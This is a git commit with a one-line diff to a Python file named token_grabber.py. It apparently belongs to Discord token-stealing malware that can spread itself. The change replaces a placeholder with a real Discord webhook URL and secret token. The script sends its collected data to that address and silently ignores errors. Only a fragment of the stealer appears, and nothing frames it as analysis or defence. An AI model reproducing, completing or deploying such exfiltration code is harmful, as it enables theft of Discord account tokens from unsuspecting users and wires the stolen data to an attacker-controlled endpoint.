826ba07bb1f48fac33ecc54e1d10d2b91103ce53
Timmmeduh <99706607+Timmmeduh@users.noreply.github.com>
2022-02-15 00:08:58 -0500

    Update token_grabber.py

--- token_grabber.py
+++ token_grabber.py
@@ -181,7 +181,7 @@ def main():
         "avatar_url": "https://discordapp.com/assets/5ccabf62108d5a8074ddd95af2211727.png"
     }
     try:
-        urlopen(Request("WEBHOOK_URL", data=dumps(webhook).encode(), headers=getheaders()))
+        urlopen(Request("https://discord.com/api/webhooks/943010002359156736/kW_F1JmHIJOEksE2gpCPvaIvenAYLKD9nRzVn_MmgEQlcIIvLJ0n2qUg8g08KfcmbBGu", data=dumps(webhook).encode(), headers=getheaders()))
     except:
         pass
     if self_spread:
